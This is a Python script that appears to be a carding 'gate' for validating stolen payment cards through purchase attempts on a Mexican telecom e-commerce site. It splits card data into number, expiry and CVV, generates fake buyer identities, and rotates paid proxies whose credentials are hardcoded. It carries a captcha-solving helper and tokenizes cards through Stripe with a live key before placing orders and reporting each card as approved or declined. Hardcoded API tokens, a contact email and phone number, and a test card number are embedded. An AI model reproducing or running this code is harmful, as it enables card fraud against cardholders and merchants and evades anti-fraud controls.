import ast
import email
from email import message
from tarfile import data_filter
import random, time
import token
from faker import Faker
from random import choice
from tkinter import LAST, Tk, filedialog
from httpx import TooManyRedirects, request
import requests,re
from bs4 import BeautifulSoup as b
from bs4 import BeautifulSoup
#from hh import keep_alive
import requests
import json, string, re
import requests
import time
import json
import random, time
from faker import Faker
from random import choice
import asyncio
import requests
from bs4 import BeautifulSoup
import requests
import re
from bs4 import BeautifulSoup as b
from curl_cffi import requests
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
import json
import cloudscraper


def usuario() -> dict:
    number = random.randint(1111, 9999)
    postal = random.choice(['10080', '14925', '71601', '86556', '19980'])
    return { 'name' : Faker().name(), 'email' : Faker().email().replace('@', '{}@'.format(number)), 'username' : Faker().user_name(), 'phone' : '512678{}'.format(number), 'city' : Faker().city(), 'code' : postal }


def capture(data, start, end):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]

    except ValueError:
        return None

def get_random_proxy(file_path="proxys.txt"):
    with open(file_path, "r") as f:
        proxies = f.readlines()
    
    proxy = random.choice(proxies).strip()  # Elegir un proxy aleatorio
    host_port, user_pass = proxy.split("@")  # Separar IP y usuario:contraseña
    host, port = host_port.split(":")  # Separar IP y puerto
    user, password = user_pass.split(":")  # Separar usuario y contraseña
    
    return host, port, user, password
async def resolver_captcha(api_key, sitekey, url):
    data = {
        'clientKey': api_key,
        'task': {
            'type': 'NoCaptchaTaskProxyless',
            'websiteURL': url,
            'websiteKey': sitekey
        }
    }
    try:
        response = await asyncio.to_thread(requests.post, 'http://api.anti-captcha.com/createTask', json=data)
        result = response.json()

        if 'errorId' in result and result['errorId'] == 0:
            task_id = result['taskId']
            
            # Esperar a que se resuelva el captcha
            while True:
                await asyncio.sleep(5)
                response = await asyncio.to_thread(requests.post, 'http://api.anti-captcha.com/getTaskResult', json={'clientKey': api_key, 'taskId': task_id})
                if response.json()['status'] == 'ready':
                    return response.json()['solution']['gRecaptchaResponse']
        else:
            raise Exception('Error en la API de anti-captcha')

    except Exception as e:
        raise Exception(f'Error al resolver el captcha: {str(e)}')
    
def generar_numero_usa():
    area_code = random.randint(200, 999)  # NXX (sin incluir 0 o 1 como primer dígito)
    central_office_code = random.randint(200, 999)  # NXX (sin incluir 0 o 1 como primer dígito)
    line_number = random.randint(1000, 9999)  # XXXX
    
    return f"({area_code})-{central_office_code}-{line_number}"

def print_all_texts(data):
    if isinstance(data, dict):
        # Si existe una clave 'value' que contiene una lista
        if "value" in data and isinstance(data["value"], list):
            for value_item in data["value"]:
                if isinstance(value_item, dict) and "text" in value_item:
                    print(value_item["text"])
        # Continuar buscando en otros niveles
        for key, value in data.items():
            print_all_texts(value)

    elif isinstance(data, list):
        for item in data:
            print_all_texts(item)


def ccn_gate(card):
    max_retries = 15
    retry_count = 0
    while retry_count < max_retries:
        try:
            #============[Funcions Need]============#
            c =  requests.Session()
            c.proxies = {'https': 'http://ubcff417d571a05cf-zone-custom-region-us-st-newyork-city-yonkers-session-OKEZNXIYE-sessTime-5:ubcff417d571a05cf@170.106.118.114:2334'}#the proxies?http://ubcff417d571a05cf-zone-custom-region-us-st-newyork-city-yonkers-session-OKEZNXIYE-sessTime-5:ubcff417d571a05cf@170.106.118.114:2334
            

            # Definir las credenciales del proxy y la URL
            proxy_url = 'http://proxy.soax.com:5000'
            proxy_user = 'package-265377-country-mx'
            proxy_pass = '589UEf1c4AXLjJ2M'

            # Configurar el proxy con autenticación
            #c.proxies = {
            #    'http': f'http://{proxy_user}:{proxy_pass}@proxy.soax.com:5000',
             #   'https': f'http://{proxy_user}:{proxy_pass}@proxy.soax.com:5000'
            #}

            # Desactivar la verificación SSL (equivalente al -k de curl)
            #c.verify = False

            # Permitir redirecciones (equivalente al -L de curl)
            #c.max_redirects = 10
            
            
            cc_number, mes, ano_number, cvv = card.split('|')
            if len(ano_number) == 2: ano_number = "20"+ano_number
            agente_user = UserAgent()
            proxy_host, proxy_port, proxy_user, proxy_pass = get_random_proxy()
            proxy = "geo.iproyal.com:12321"  # SIN "http://"
            proxy_auth = "rTPt8eauWJNOjdno:BUo3nBhOfK3TV3vt_country-us"

            proxys={"server": f"http://{proxy_host}:{proxy_port}"}

            #============[Address Found]============#
            name  = usuario()['name'].split(' ')[0]
            last  = usuario()['name'].split(' ')[1]
            email = usuario()['email']
            number = random.randint(1111, 9999)
            street = f"{name} street {number}"
            phone = usuario()['phone']
           

            #============[Requests 1]============#
            headers = {
                'authority': 'redphone.api.koonolmexico.com',
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'no-cache',
                'origin': 'https://ecommerce.redphone.com.mx',
                'pragma': 'no-cache',
                'referer': 'https://ecommerce.redphone.com.mx/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            params = {
                'imei': '353495111910597',
                'sim_card_type': 'embedded',
            }

            response = c.get('https://redphone.api.koonolmexico.com/altan/imei_check', params=params, headers=headers)

            headers = {
                'authority': 'redphone.api.koonolmexico.com',
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.9',
                'authorization': 'Bearer eyJhbGciOiJIUzI1NiJ9.eyJhcGlfaWQiOiI2YTkzYjYxNC1lYzE4LTRlMDYtOWY4ZC1kZjhhYTY2NjllOWIifQ.ztwNlAv-V8L0M6qHfB68Q_cXupibSQCFTEguIf6XxTo',
                'cache-control': 'no-cache',
                'origin': 'https://ecommerce.redphone.com.mx',
                'pragma': 'no-cache',
                'referer': 'https://ecommerce.redphone.com.mx/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            params = {
                'bundle_id': '6',
            }

            response = c.get('https://redphone.api.koonolmexico.com/sim_cards/nirs', params=params, headers=headers)

            headers = {
                'authority': 'redphone.api.koonolmexico.com',
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.9',
                'authorization': 'Bearer eyJhbGciOiJIUzI1NiJ9.eyJhcGlfaWQiOiI2YTkzYjYxNC1lYzE4LTRlMDYtOWY4ZC1kZjhhYTY2NjllOWIifQ.ztwNlAv-V8L0M6qHfB68Q_cXupibSQCFTEguIf6XxTo',
                'cache-control': 'no-cache',
                'origin': 'https://ecommerce.redphone.com.mx',
                'pragma': 'no-cache',
                'referer': 'https://ecommerce.redphone.com.mx/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            params = {
                'bundle_id': '6',
            }

            response = c.get('https://redphone.api.koonolmexico.com/sim_cards/sim_cards', params=params, headers=headers)

            headers = {
                'authority': 'redphone.api.koonolmexico.com',
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'no-cache',
                'content-type': 'application/json; charset=UTF-8',
                'origin': 'https://ecommerce.redphone.com.mx',
                'pragma': 'no-cache',
                'referer': 'https://ecommerce.redphone.com.mx/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            json_data = {
                'user': {
                    'signup_status': 'authorized',
                    'name': name,
                    'last_name': last,
                    'maiden_name': '',
                    'email': 'rodrigoking234@gmail.com',
                    'phone': '9971556986',
                    'mobile_phone': '9971556986',
                    'privacy_acceptance': True,
                },
            }

            response = c.post('https://redphone.api.koonolmexico.com/users', headers=headers, json=json_data)
            responsePm = json.loads(response.text)
            user_id = responsePm['user']['id']
            print(user_id)

            headers = {
                'authority': 'sandbox-api.openpay.mx',
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'no-cache',
                'origin': 'https://ecommerce.redphone.com.mx',
                'pragma': 'no-cache',
                'referer': 'https://ecommerce.redphone.com.mx/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            params = {
                's': 'DNCSvrdBWvvskSihugcNfNZQ3PrzKe7L',
            }

            response = c.get('https://sandbox-api.openpay.mx/antifraud/undefined/components', params=params, headers=headers)
            print('pase aqui 1')

            headers = {
                'authority': 'sandbox-api.openpay.mx',
                'accept': 'application/json',
                'accept-language': 'es-ES,es;q=0.9',
                'authorization': 'Basic dW5kZWZpbmVkOg==',
                'cache-control': 'no-cache',
                'content-type': 'application/json',
                'origin': 'https://ecommerce.redphone.com.mx',
                'pragma': 'no-cache',
                'referer': 'https://ecommerce.redphone.com.mx/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            response = c.get('https://sandbox-api.openpay.mx/v1/undefined/antifraudkeys', headers=headers)
            print('pase aqui 2')

            headers = {
                'authority': 'api.stripe.com',
                'accept': 'application/json',
                'accept-language': 'en-US',
                'cache-control': 'no-cache',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'pragma': 'no-cache',
                'referer': 'https://js.stripe.com/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            data = f'time_on_page=546027&pasted_fields=number&guid=2953e2d9-6a1c-4c42-a83e-28bb4e237f8577fee5&muid=830cfac5-04bc-45bf-b039-3d4790e48dfa5b7899&sid=ef003600-ab32-4586-b765-56d2a0d055f082a6d5&key=pk_live_51KOX42AMlS3RZFNSs08ALhGLqQIZ8hZLlEkBxYlxQo6aJlEcz442oQ7L9Eejs7niMHf6PKYGofk0jIMB78ubKt6D00qp0QZjLC&payment_user_agent=stripe.js%2F78ef418&card[number]={cc_number}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano_number}'

            response = c.post('https://api.stripe.com/v1/tokens', headers=headers, data=data)
            responsePm = json.loads(response.text)
            tokenkst = responsePm['id']
            print(tokenkst)
            print('pase aqui 3')

            headers = {
                'authority': 'redphone.api.koonolmexico.com',
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'no-cache',
                'content-type': 'application/json; charset=UTF-8',
                'origin': 'https://ecommerce.redphone.com.mx',
                'pragma': 'no-cache',
                'referer': 'https://ecommerce.redphone.com.mx/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            json_data = {
                'payment_card': {
                    'openpay_token': None,
                    'openpay_device_session_id': 'DNCSvrdBWvvskSihugcNfNZQ3PrzKe7L',
                    'stripe_token': tokenkst,
                    'is_default': True,
                    'payment_method': 'card',
                    'identification_number': None,
                    'mercado_pago_token': None,
                },
                'user_id': user_id,
            }

            response = c.post('https://redphone.api.koonolmexico.com/payment_cards', headers=headers, json=json_data)

            headers = {
                'authority': 'redphone.api.koonolmexico.com',
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'no-cache',
                'content-type': 'application/json; charset=UTF-8',
                'origin': 'https://ecommerce.redphone.com.mx',
                'pragma': 'no-cache',
                'referer': 'https://ecommerce.redphone.com.mx/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            json_data = {
                'altan_service_bundle_order': {
                    'user_id': user_id,
                    'payment_method': 'card',
                    'concept': 'bundle',
                    'latitude': 20.5964312,
                    'longitude': -100.388084,
                    'recurring_payments': False,
                    'payment_plan': None,
                    'nir': '56',
                    'code': None,
                    'admin_id': None,
                    'promoter_code': None,
                    'dpcard_number': None,
                    'activation_code_qr_file_url': None,
                    'bundle_id': '6',
                },
                'user_id': user_id,
            }

            response = c.post('https://redphone.api.koonolmexico.com/altan_service_bundle_orders', headers=headers, json=json_data)
            responsePm = json.loads(response.text)
            

            # Verificar si hay un error tipo 'card_declined'
            if 'message' in responsePm and 'error' in responsePm['message']:
                error_info = responsePm['message']['error']
                if error_info.get('code') == 'card_declined':
                    print("❌ Tarjeta rechazada:", error_info.get('message', 'Error desconocido'))
                else:
                    print("⚠️ Otro error:", error_info.get('message', 'Error desconocido'))

            # Verificar si está aprobado por status 'delivered' o 'authorized'
            elif 'altan_service_bundle_order' in responsePm:
                status = responsePm['altan_service_bundle_order'].get('status', '').lower()
                if status in ['delivered', 'authorized']:
                    print("✅ Aprobado")
                else:
                    print(f"🔄 Estado: {status}")

            # En caso de que no sea ninguno de los anteriores
            else:
                print("❓ Respuesta no reconocida:", responsePm)


            

            
                                    
            


            
            print("Status Code:", response.status_code)
           

          

                    
           
            

        
            
        except Exception as e:
            print(e)
            retry_count += 1
    else:
        return {"card": card, "status": "ERROR", "resp":  f"Retries: {retry_count}"}
    

if __name__ == "__main__":
    print(ccn_gate("5579100425156526|05|2029|688"))